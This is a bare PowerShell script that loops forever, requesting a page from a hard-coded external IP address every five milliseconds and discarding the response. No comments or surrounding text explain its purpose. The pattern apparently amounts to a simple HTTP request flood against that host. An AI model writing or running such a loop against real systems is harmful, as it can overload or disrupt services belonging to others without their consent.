while ($true)
{
    (New-Object Net.WebClient).DownloadString("http://51.11.128.195/")
    Start-Sleep -Milliseconds 5
}